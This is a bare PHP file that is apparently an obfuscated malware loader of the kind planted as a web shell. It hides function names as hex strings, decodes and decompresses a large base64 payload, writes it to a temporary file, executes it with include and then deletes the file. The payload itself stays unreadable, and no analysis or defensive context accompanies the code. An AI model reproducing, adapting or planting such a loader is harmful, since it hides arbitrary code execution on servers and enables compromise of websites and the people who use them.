<?php
$arr = array(
'746d7066696c65',
'73747265616d5f6765745f6d6574615f64617461',
'667772697465',
'66636c6f7365',
'677a696e666c617465',
'6261736536345f6465636f6465'
);
$hitung_array = count($arr);
for ($i = 0; $i < $hitung_array; $i++) {
    $f[] = ss($arr[$i]);
}
function ss($str) {
    $r = "";
    $len = (strlen($str) -1);
    for ($i = 0; $i < $len; $i += 2)
        $r .= chr(hexdec($str[$i].$str[$i+1]));
    return $r;
}
$xx=$f[4]($f[5]('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'));
$sHizuo = $f[0]();
$SHizuo = $f[1]($sHizuo);
$SHizuo = $SHizuo["uri"];
$f[2]($sHizuo, $xx);
$ShIzuO = include ($SHizuo);
$f[3]($sHizuo);
return $ShIzuO;
?>
